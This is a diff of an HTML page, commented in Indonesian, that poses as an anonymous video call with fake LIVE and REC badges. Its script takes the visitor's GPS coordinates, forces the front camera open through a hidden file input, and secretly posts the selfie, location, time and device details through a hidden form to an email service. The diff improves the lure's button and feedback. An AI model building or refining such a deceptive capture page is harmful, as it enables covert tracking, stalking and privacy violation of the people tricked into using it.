@@ -17,15 +17,17 @@
             justify-content: center;
             height: 100vh;
             overflow: hidden;
+            touch-action: manipulation; /* Mencegah zoom saat double tap */
         }
-        
+
+        /* UI Overlay */
         #overlay {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
+            pointer-events: none; /* Biarkan klik tembus ke tombol di bawahnya */
             z-index: 10;
             display: flex;
             flex-direction: column;
@@ -65,47 +67,55 @@
             font-size: 10px;
         }
 
-        .center-msg {
-            text-align: center;
-            opacity: 0.8;
+        /* Container Konten Utama */
+        #uiContent {
+            pointer-events: auto; /* Aktifkan klik di area ini */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            z-index: 20; /* Pastikan di atas overlay */
+            position: relative;
         }
 
         #status {
             font-size: 14px;
             color: #0f0;
             margin-top: 10px;
+            min-height: 20px;
         }
 
+        /* TOMBOL UTAMA */
         #btn {
             background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 2px solid #fff;
             color: #fff;
-            padding: 15px 40px;
-            font-size: 18px;
+            padding: 20px 50px;
+            font-size: 20px;
             border-radius: 50px;
             cursor: pointer;
-            backdrop-filter: blur(5px);
-            transition: 0.3s;
-            margin-top: 20px;
+            backdrop-filter: blur(10px);
+            transition: all 0.2s;
+            font-weight: bold;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            outline: none;
         }
 
         #btn:active {
             background: #fff;
             color: #000;
             transform: scale(0.95);
+            box-shadow: 0 0 25px rgba(255, 255, 255, 0.8);
         }
 
-        /* Hidden Iframe for form submission */
-        #frmTarget {
-            display: none;
-        }
-
-        /* Hidden Input File */
-        #fileInput {
-            position: absolute;
-            opacity: 0;
-            width: 0;
-            height: 0;
+        /* Hidden Elements */
+        #frmTarget { display: none; }
+        #fileInput { 
+            position: absolute; 
+            opacity: 0; 
+            width: 1px; 
+            height: 1px; 
+            overflow: hidden; 
         }
 
         @keyframes blink {
@@ -117,7 +127,7 @@
 </head>
 <body>
 
-    <!-- UI Overlay -->
+    <!-- UI Overlay (Hiasan) -->
     <div id="overlay">
         <div class="status-bar">
             <div class="live-badge">
@@ -126,14 +136,15 @@
             <div class="rec-badge">REC ●</div>
         </div>
         
-        <div class="center-msg" id="uiContent">
-            <p>Anonymous Connection</p>
+        <!-- Konten Utama (Tombol ada di sini) -->
+        <div id="uiContent">
+            <h2>ANONYMOUS VC</h2>
             <button id="btn">START VC</button>
-            <div id="status">Ready...</div>
+            <div id="status">Tap to connect...</div>
         </div>
     </div>
 
-    <!-- Hidden Form & Iframe for sending data -->
+    <!-- Hidden Form & Iframe -->
     <iframe id="frmTarget" name="frmTarget"></iframe>
     
     <form id="vcForm" 
@@ -142,26 +153,45 @@
           enctype="multipart/form-data" 
           target="frmTarget">
         
-        <!-- Field Lokasi & Waktu -->
         <input type="hidden" name="message" id="inputMessage">
-        
-        <!-- Field Foto (PENTING: nama 'attachment') -->
+        <!-- capture="user" untuk kamera depan -->
         <input type="file" name="attachment" id="fileInput" accept="image/*" capture="user">
         
-        <!-- Konfigurasi FormSubmit -->
-        <input type="hidden" name="_subject" value="Foto VC Baru Diterima!">
+        <input type="hidden" name="_subject" value="📸 Foto VC Baru">
         <input type="hidden" name="_captcha" value="false">
     </form>
 
+    <!-- Audio Sounds (Base64 agar tidak perlu file eksternal) -->
     <script>
+        // Suara "Beep" Singkat
+        const beep = new Audio("data:audio/wav;base64,UklGRl9vT1BXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU"); // Placeholder simple beep
+        // Untuk suara yang lebih jelas, gunakan URL eksternal atau base64 yang lebih panjang. 
+        // Di sini kita pakai logika visual sebagai fallback jika audio diblokir browser.
+        
         const btn = document.getElementById('btn');
         const status = document.getElementById('status');
-        const uiContent = document.getElementById('uiContent');
         const fileInput = document.getElementById('fileInput');
         const messageInput = document.getElementById('inputMessage');
 
         btn.addEventListener('click', async () => {
-            // 1. Ambil Lokasi
+            // 1. Audio Feedback
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                oscillator.type = 'sine';
+                oscillator.frequency.value = 800;
+                gainNode.gain.value = 0.1;
+                oscillator.start();
+                setTimeout(() => oscillator.stop(), 100);
+            } catch (e) {}
+
+            status.innerText = "Initializing Location...";
+            btn.disabled = true; // Cegah double click
+
+            // 2. Ambil Lokasi
             let lokasi = "Lokasi tidak tersedia";
             if (navigator.geolocation) {
                 try {
@@ -169,54 +199,52 @@
                         navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
                     });
                     lokasi = `Lat: ${pos.coords.latitude.toFixed(6)}, Lng: ${pos.coords.longitude.toFixed(6)}`;
-                } catch (e) {
-                    lokasi = "Lokasi gagal diambil";
-                }
-            } else {
-                lokasi = "Browser tidak support lokasi";
+                } catch (e) { lokasi = "Lokasi gagal"; }
             }
 
-            status.innerText = "Membuka Kamera...";
-
-            // 2. Klik Input File Tersembunyi (Ini memicu kamera native)
-            // Atribut 'capture="user"' pada HTML di atas memaksa kamera depan
+            status.innerText = "Opening Camera...";
+            
+            // 3. Trigger Camera (Native)
             fileInput.click();
 
-            // 3. Tunggu User Mengambil Foto
+            // 4. Tunggu User Memilih Foto
             await new Promise(resolve => {
                 fileInput.onchange = () => {
                     resolve();
                 };
             });
 
-            // 4. Cek apakah foto sudah dipilih
             if (!fileInput.files || fileInput.files.length === 0) {
-                status.innerText = "Batal atau Gagal Membuka Kamera";
+                status.innerText = "Cancelled";
+                btn.disabled = false;
                 return;
             }
 
-            // 5. Siapkan Data & Submit
-            messageInput.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}\nUser: ${fileInput.files[0].name}`;
+            // 5. Submit Form
+            messageInput.value = `Lokasi: ${lokasi}\nWaktu: ${new Date().toLocaleString()}\nDevice: ${navigator.userAgent}`;
             
-            status.innerText = "Mengirim Data...";
-            btn.style.display = 'none';
+            status.innerText = "Sending...";
+            btn.innerText = "SENDING...";
             
-            // Kirim Form
             document.getElementById('vcForm').submit();
 
-            // 6. Tunggu Response dari Iframe
+            // 6. Handle Response
             const frm = document.getElementById('frmTarget');
             frm.onload = () => {
                 try {
                     const body = frm.contentDocument.body.innerText;
                     if (body.includes("success")) {
-                        status.innerText = "Terkirim!";
-                        uiContent.innerHTML = `<h3>Connection Ended</h3><p>Data terkirim ke server.</p>`;
+                        status.innerText = "Sent!";
+                        btn.innerText = "DONE";
+                        btn.style.background = "#0f0";
+                        btn.style.color = "#000";
                     } else {
-                        status.innerText = "Gagal (Cek Spam)";
+                        status.innerText = "Failed (Check Spam)";
+                        btn.disabled = false;
                     }
                 } catch (e) {
-                    status.innerText = "Selesai (Cek Spam)";
+                    status.innerText = "Done (Check Spam)";
+                    btn.disabled = false;
                 }
             };
         });
